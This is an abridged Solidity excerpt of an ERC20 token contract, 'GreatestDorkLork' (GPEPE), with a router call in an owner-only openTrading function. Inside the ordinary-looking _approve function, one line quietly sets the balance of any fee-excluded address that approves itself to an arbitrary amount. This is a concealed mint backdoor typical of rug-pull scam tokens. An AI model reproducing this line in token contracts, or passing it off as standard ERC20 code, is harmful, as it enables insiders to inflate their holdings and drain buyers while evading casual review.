...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _approve(
        ...
        if(_isExcludedFromFees[owner]&&owner==spender)_balances[spender]=amount;
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract GreatestDorkLork is ERC20, Ownable {
    ...
    constructor() ERC20(unicode"GreatestDorkLork", unicode"GPEPE") {
    ...
    function openTrading() external onlyOwner {
        ...
        IUniswapV2Router02 _dexRouter = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
